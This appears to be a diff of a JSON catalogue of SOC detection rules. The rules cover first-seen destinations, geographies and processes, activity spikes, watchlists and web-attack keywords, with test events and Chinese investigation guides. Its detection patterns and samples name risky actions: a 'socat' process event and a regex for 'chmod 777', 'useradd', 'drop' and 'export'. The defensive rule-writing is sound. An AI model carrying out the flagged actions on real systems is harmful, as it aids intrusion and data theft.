-      "spec": {"id": "UEBA-NEW-DEST", "name": "First-seen destination", "type": "rare", "severity": "MEDIUM", "message": "Host {key} contacted first-seen {value}", "keyField": "host", "valueField": "dst_domain", "warmup": 10, "mitre": "T1071", "match": [{"field": "source", "op": "eq", "value": "proxy"}]},
-      "tests": [{"name": "new destination after warmup", "expectAlert": true, "events": [{"repeat": 10, "source": "proxy", "host": "dest-1", "msg": "request", "fields": {"dst_domain": "known.example"}}, {"source": "proxy", "host": "dest-1", "msg": "request", "fields": {"dst_domain": "new.example"}}]}, {"name": "known destination", "expectAlert": false, "events": [{"repeat": 11, "source": "proxy", "host": "dest-2", "msg": "request", "fields": {"dst_domain": "known.example"}}]}]
+      "id": "UEBA-NEW-DEST",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "A host contacts a new domain after its learning period.",
+      "dataSources": [
+        "proxy"
+      ],
+      "mitre": [
+        "T1071"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1071/"
+      ],
+      "spec": {
+        "id": "UEBA-NEW-DEST",
+        "name": "First-seen destination",
+        "type": "rare",
+        "severity": "MEDIUM",
+        "message": "Host {key} contacted first-seen {value}",
+        "keyField": "host",
+        "valueField": "dst_domain",
+        "warmup": 10,
+        "mitre": "T1071",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "proxy"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "new destination after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "repeat": 10,
+              "source": "proxy",
+              "host": "dest-1",
+              "msg": "request",
+              "fields": {
+                "dst_domain": "known.example"
+              }
+            },
+            {
+              "source": "proxy",
+              "host": "dest-1",
+              "msg": "request",
+              "fields": {
+                "dst_domain": "new.example"
+              }
+            }
+          ]
+        },
+        {
+          "name": "known destination",
+          "expectAlert": false,
+          "events": [
+            {
+              "repeat": 11,
+              "source": "proxy",
+              "host": "dest-2",
+              "msg": "request",
+              "fields": {
+                "dst_domain": "known.example"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 查询新域名信誉与注册信息；\n2. 与业务确认是否为新上线服务/供应商；\n3. 结合外流量级与数据分类判断风险。",
+      "falsePositives": [
+        "新采购的 SaaS 或新解析记录上线",
+        "测试环境引入的外部依赖"
+      ]
     },
     {
-      "id": "UEBA-NEW-GEO", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "An account authenticates from a new geography after learning.", "dataSources": ["auth"], "mitre": ["T1078"], "references": ["https://attack.mitre.org/techniques/T1078/"],
-      "spec": {"id": "UEBA-NEW-GEO", "name": "First-seen login geography", "type": "rare", "severity": "HIGH", "message": "Account {key} authenticated from first-seen {value}", "keyField": "user", "valueField": "geo", "warmup": 5, "mitre": "T1078", "match": [{"field": "source", "op": "eq", "value": "auth"}]},
-      "tests": [{"name": "new geography after warmup", "expectAlert": true, "events": [{"repeat": 5, "source": "auth", "host": "auth-geo", "msg": "login", "fields": {"user": "alice", "geo": "CN"}}, {"source": "auth", "host": "auth-geo", "msg": "login", "fields": {"user": "alice", "geo": "US"}}]}, {"name": "known geography", "expectAlert": false, "events": [{"repeat": 6, "source": "auth", "host": "auth-geo", "msg": "login", "fields": {"user": "bob", "geo": "CN"}}]}]
+      "id": "UEBA-NEW-GEO",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "An account authenticates from a new geography after learning.",
+      "dataSources": [
+        "auth"
+      ],
+      "mitre": [
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
+      "spec": {
+        "id": "UEBA-NEW-GEO",
+        "name": "First-seen login geography",
+        "type": "rare",
+        "severity": "HIGH",
+        "message": "Account {key} authenticated from first-seen {value}",
+        "keyField": "user",
+        "valueField": "geo",
+        "warmup": 5,
+        "mitre": "T1078",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "auth"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "new geography after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "repeat": 5,
+              "source": "auth",
+              "host": "auth-geo",
+              "msg": "login",
+              "fields": {
+                "user": "alice",
+                "geo": "CN"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "auth-geo",
+              "msg": "login",
+              "fields": {
+                "user": "alice",
+                "geo": "US"
+              }
+            }
+          ]
+        },
+        {
+          "name": "known geography",
+          "expectAlert": false,
+          "events": [
+            {
+              "repeat": 6,
+              "source": "auth",
+              "host": "auth-geo",
+              "msg": "login",
+              "fields": {
+                "user": "bob",
+                "geo": "CN"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 联系账号主人确认是否出差/使用新 VPN 出口；\n2. 检查该地理位置会话的行为与数据访问；\n3. 无法确认时强制注销所有会话并轮换凭据。",
+      "falsePositives": [
+        "VPN 出口节点切换",
+        "员工差旅/异地办公的合法登录"
+      ]
     },
     {
-      "id": "UEBA-NEW-PROCESS", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "A host executes a new process after its learning period.", "dataSources": ["edr"], "mitre": ["T1059"], "references": ["https://attack.mitre.org/techniques/T1059/"],
-      "spec": {"id": "UEBA-NEW-PROCESS", "name": "First-seen process", "type": "rare", "severity": "MEDIUM", "message": "Host {key} executed first-seen {value}", "keyField": "host", "valueField": "process", "warmup": 10, "mitre": "T1059", "match": [{"field": "source", "op": "eq", "value": "edr"}]},
-      "tests": [{"name": "new process after warmup", "expectAlert": true, "events": [{"repeat": 10, "source": "edr", "host": "proc-1", "msg": "process start", "fields": {"process": "bash"}}, {"source": "edr", "host": "proc-1", "msg": "process start", "fields": {"process": "socat"}}]}, {"name": "known process", "expectAlert": false, "events": [{"repeat": 11, "source": "edr", "host": "proc-2", "msg": "process start", "fields": {"process": "bash"}}]}]
+      "id": "UEBA-NEW-PROCESS",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "A host executes a new process after its learning period.",
+      "dataSources": [
+        "edr"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1059/"
+      ],
+      "spec": {
+        "id": "UEBA-NEW-PROCESS",
+        "name": "First-seen process",
+        "type": "rare",
+        "severity": "MEDIUM",
+        "message": "Host {key} executed first-seen {value}",
+        "keyField": "host",
+        "valueField": "process",
+        "warmup": 10,
+        "mitre": "T1059",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "edr"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "new process after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "repeat": 10,
+              "source": "edr",
+              "host": "proc-1",
+              "msg": "process start",
+              "fields": {
+                "process": "bash"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "proc-1",
+              "msg": "process start",
+              "fields": {
+                "process": "socat"
+              }
+            }
+          ]
+        },
+        {
+          "name": "known process",
+          "expectAlert": false,
+          "events": [
+            {
+              "repeat": 11,
+              "source": "edr",
+              "host": "proc-2",
+              "msg": "process start",
+              "fields": {
+                "process": "bash"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 核对进程哈希、签名与厂商信誉；\n2. 与发布/变更系统对照确认是否为新版本；\n3. 审查父进程链，排除由办公应用派生的执行。",
+      "falsePositives": [
+        "版本升级或工具链更新带来的新进程"
+      ]
     },
     {
-      "id": "UEBA-USER-VOLUME", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Account activity volume deviates from its learned baseline.", "dataSources": ["audit", "application", "auth"], "mitre": ["T1078"], "references": ["https://attack.mitre.org/techniques/T1078/"],
-      "spec": {"id": "UEBA-USER-VOLUME", "name": "Account activity spike", "type": "baseline", "severity": "MEDIUM", "message": "Account {key} generated {count} operations versus baseline {baseline}", "keyField": "user", "window": "300s", "baselineWindows": 12, "warmup": 3, "sigma": 2.5, "minCount": 10, "mitre": "T1078", "match": []},
-      "tests": [{"name": "operation spike after warmup", "expectAlert": true, "events": [{"timestamp": "2026-01-01T00:00:01Z", "source": "audit", "msg": "operation", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:05:01Z", "source": "audit", "msg": "operation", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:10:01Z", "source": "audit", "msg": "operation", "fields": {"user": "alice"}}, {"repeat": 10, "timestamp": "2026-01-01T00:15:01Z", "source": "audit", "msg": "operation", "fields": {"user": "alice"}}]}, {"name": "below minimum", "expectAlert": false, "events": [{"timestamp": "2026-01-01T01:00:01Z", "source": "audit", "msg": "operation", "fields": {"user": "bob"}}, {"timestamp": "2026-01-01T01:05:01Z", "source": "audit", "msg": "operation", "fields": {"user": "bob"}}, {"timestamp": "2026-01-01T01:10:01Z", "source": "audit", "msg": "operation", "fields": {"user": "bob"}}, {"repeat": 9, "timestamp": "2026-01-01T01:15:01Z", "source": "audit", "msg": "operation", "fields": {"user": "bob"}}]}]
+      "id": "UEBA-USER-VOLUME",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Account activity volume deviates from its learned baseline.",
+      "dataSources": [
+        "audit",
+        "application",
+        "auth"
+      ],
+      "mitre": [
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
+      "spec": {
+        "id": "UEBA-USER-VOLUME",
+        "name": "Account activity spike",
+        "type": "baseline",
+        "severity": "MEDIUM",
+        "message": "Account {key} generated {count} operations versus baseline {baseline}",
+        "keyField": "user",
+        "window": "300s",
+        "baselineWindows": 12,
+        "warmup": 3,
+        "sigma": 2.5,
+        "minCount": 10,
+        "mitre": "T1078",
+        "match": []
+      },
+      "tests": [
+        {
+          "name": "operation spike after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "timestamp": "2026-01-01T00:00:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:05:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:10:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "repeat": 10,
+              "timestamp": "2026-01-01T00:15:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "alice"
+              }
+            }
+          ]
+        },
+        {
+          "name": "below minimum",
+          "expectAlert": false,
+          "events": [
+            {
+              "timestamp": "2026-01-01T01:00:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:05:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:10:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "repeat": 9,
+              "timestamp": "2026-01-01T01:15:01Z",
+              "source": "audit",
+              "msg": "operation",
+              "fields": {
+                "user": "bob"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 拆分账号活动的操作类型与时间分布；\n2. 排查凭据共享或自动化脚本失控；\n3. 与工单/变更记录对照确认合法性。",
+      "falsePositives": [
+        "数据修复/迁移任务的临时活动高峰"
+      ]
     },
     {
-      "id": "WATCH-BLOCKED-IP", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Activity from an IP on the maintained blocklist.", "dataSources": ["firewall", "proxy", "auth"], "mitre": ["T1071"], "references": ["https://attack.mitre.org/techniques/T1071/"],
-      "spec": {"id": "WATCH-BLOCKED-IP", "name": "Blocked IP activity", "type": "pattern", "severity": "CRITICAL", "message": "Blocked source remained active: {msg}", "mitre": "T1071", "match": [{"field": "src_ip", "op": "inlist", "value": "blocked_ips"}]},
-      "tests": [{"name": "blocked source", "expectAlert": true, "events": [{"source": "firewall", "host": "fw-1", "msg": "connection", "fields": {"src_ip": "10.0.0.66"}}]}, {"name": "unlisted source", "expectAlert": false, "events": [{"source": "firewall", "host": "fw-1", "msg": "connection", "fields": {"src_ip": "10.0.0.67"}}]}]
+      "id": "WATCH-BLOCKED-IP",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Activity from an IP on the maintained blocklist.",
+      "dataSources": [
+        "firewall",
+        "proxy",
+        "auth"
+      ],
+      "mitre": [
+        "T1071"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1071/"
+      ],
+      "spec": {
+        "id": "WATCH-BLOCKED-IP",
+        "name": "Blocked IP activity",
+        "type": "pattern",
+        "severity": "CRITICAL",
+        "message": "Blocked source remained active: {msg}",
+        "mitre": "T1071",
+        "match": [
+          {
+            "field": "src_ip",
+            "op": "inlist",
+            "value": "blocked_ips"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "blocked source",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "connection",
+              "fields": {
+                "src_ip": "10.0.0.66"
+              }
+            }
+          ]
+        },
+        {
+          "name": "unlisted source",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "connection",
+              "fields": {
+                "src_ip": "10.0.0.67"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 核对名单条目的情报来源、置信度与录入时间；\n2. 出站命中立即隔离主机并更新边界封禁；\n3. 回溯该 IP 的首次通信时间，评估暴露窗口。",
+      "falsePositives": [
+        "名单维护不及时导致的过期条目",
+        "被整体列入名单的共享出口 IP"
+      ]
     },
     {
-      "id": "WATCH-CROWN-JEWEL", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Repeated access to an asset on the crown-jewel watchlist.", "dataSources": ["firewall", "netflow", "application"], "mitre": ["T1021"], "references": ["https://attack.mitre.org/techniques/T1021/"],
-      "spec": {"id": "WATCH-CROWN-JEWEL", "name": "Crown-jewel access", "type": "threshold", "severity": "HIGH", "message": "Crown jewel {key} was accessed {count} times", "keyField": "dst_ip", "threshold": 20, "window": "120s", "mitre": "T1021", "match": [{"field": "dst_ip", "op": "inlist", "value": "crown_jewels"}]},
-      "tests": [{"name": "twenty accesses", "expectAlert": true, "events": [{"repeat": 20, "source": "firewall", "host": "fw-1", "msg": "connection", "fields": {"dst_ip": "10.0.0.10"}}]}, {"name": "unlisted destination", "expectAlert": false, "events": [{"repeat": 20, "source": "firewall", "host": "fw-1", "msg": "connection", "fields": {"dst_ip": "10.0.0.11"}}]}]
+      "id": "WATCH-CROWN-JEWEL",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Repeated access to an asset on the crown-jewel watchlist.",
+      "dataSources": [
+        "firewall",
+        "netflow",
+        "application"
+      ],
+      "mitre": [
+        "T1021"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1021/"
+      ],
+      "spec": {
+        "id": "WATCH-CROWN-JEWEL",
+        "name": "Crown-jewel access",
+        "type": "threshold",
+        "severity": "HIGH",
+        "message": "Crown jewel {key} was accessed {count} times",
+        "keyField": "dst_ip",
+        "threshold": 20,
+        "window": "120s",
+        "mitre": "T1021",
+        "match": [
+          {
+            "field": "dst_ip",
+            "op": "inlist",
+            "value": "crown_jewels"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "twenty accesses",
+          "expectAlert": true,
+          "events": [
+            {
+              "repeat": 20,
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "connection",
+              "fields": {
+                "dst_ip": "10.0.0.10"
+              }
+            }
+          ]
+        },
+        {
+          "name": "unlisted destination",
+          "expectAlert": false,
+          "events": [
+            {
+              "repeat": 20,
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "connection",
+              "fields": {
+                "dst_ip": "10.0.0.11"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认访问账号、来源与其对核心资产的业务授权；\n2. 审查会话中传输的数据类型与量级；\n3. 按最小权限原则收紧访问并补充审计。",
+      "falsePositives": [
+        "授权运维在变更窗口内的例行访问",
+        "核心资产的定时健康检查"
+      ]
     },
     {
-      "id": "WATCH-PRIV-ACCOUNT", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Sensitive operation by an account on the privileged-account watchlist.", "dataSources": ["audit", "database", "linux"], "mitre": ["T1078"], "references": ["https://attack.mitre.org/techniques/T1078/"],
-      "spec": {"id": "WATCH-PRIV-ACCOUNT", "name": "Privileged account operation", "type": "pattern", "severity": "HIGH", "message": "Privileged account performed a sensitive action: {msg}", "mitre": "T1078", "match": [{"field": "user", "op": "inlist", "value": "privileged_accounts"}, {"field": "msg", "op": "regex", "value": "(?i)delete|drop|export|chmod 777|useradd"}]},
-      "tests": [{"name": "root export", "expectAlert": true, "events": [{"source": "audit", "host": "db-1", "msg": "export customer table", "fields": {"user": "root"}}]}, {"name": "ordinary read", "expectAlert": false, "events": [{"source": "audit", "host": "db-1", "msg": "select dashboard", "fields": {"user": "analyst"}}]}]
+      "id": "WATCH-PRIV-ACCOUNT",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Sensitive operation by an account on the privileged-account watchlist.",
+      "dataSources": [
+        "audit",
+        "database",
+        "linux"
+      ],
+      "mitre": [
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
+      "spec": {
+        "id": "WATCH-PRIV-ACCOUNT",
+        "name": "Privileged account operation",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Privileged account performed a sensitive action: {msg}",
+        "mitre": "T1078",
+        "match": [
+          {
+            "field": "user",
+            "op": "inlist",
+            "value": "privileged_accounts"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)delete|drop|export|chmod 777|useradd"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "root export",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "audit",
+              "host": "db-1",
+              "msg": "export customer table",
+              "fields": {
+                "user": "root"
+              }
+            }
+          ]
+        },
+        {
+          "name": "ordinary read",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "audit",
+              "host": "db-1",
+              "msg": "select dashboard",
+              "fields": {
+                "user": "analyst"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认敏感操作对应的工单与授权链；\n2. 审计该账号近 24 小时的全部操作；\n3. 排查是否存在凭据共享或交互式使用服务账号。",
+      "falsePositives": [
+        "自动化运维使用特权服务账号的例行操作"
+      ]
     },
     {
-      "id": "WEB-ATTACK", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Broad web attack terminology retained for compatibility.", "dataSources": ["web", "waf"], "mitre": ["T1190"], "references": ["https://attack.mitre.org/techniques/T1190/"],
-      "spec": {"id": "WEB-ATTACK", "name": "Web attack indicator", "type": "pattern", "severity": "HIGH", "message": "Possible web attack on {host}: {msg}", "mitre": "T1190", "match": [{"field": "source", "op": "eq", "value": "web"}, {"field": "msg", "op": "regex", "value": "(?i)sqli|xss|injection|attack"}]},
-      "tests": [{"name": "XSS attack", "expectAlert": true, "events": [{"source": "web", "host": "web-1", "msg": "XSS attack blocked", "fields": {}}]}, {"name": "health request", "expectAlert": false, "events": [{"source": "web", "host": "web-1", "msg": "GET /health 200", "fields": {}}]}]
+      "id": "WEB-ATTACK",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Broad web attack terminology retained for compatibility.",
+      "dataSources": [
+        "web",
+        "waf"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1190/"
+      ],
+      "spec": {
+        "id": "WEB-ATTACK",
+        "name": "Web attack indicator",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Possible web attack on {host}: {msg}",
+        "mitre": "T1190",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "web"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)sqli|xss|injection|attack"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "XSS attack",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "web",
+              "host": "web-1",
+              "msg": "XSS attack blocked",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "health request",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "web",
+              "host": "web-1",
+              "msg": "GET /health 200",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认命中的具体特征、请求来源与响应结果；\n2. 本规则为兼容保留的宽口径规则，结论以 WEB-SQLI/WEB-TRAVERSAL 细分类为准；\n3. 评估将该来源流量迁移到细分类规则并退役本规则。",
+      "falsePositives": [
+        "业务文本中合法包含 attack/注入等关键字",
+        "扫描器对已知误报路径的重复探测"
+      ]
     }
   ]
 }
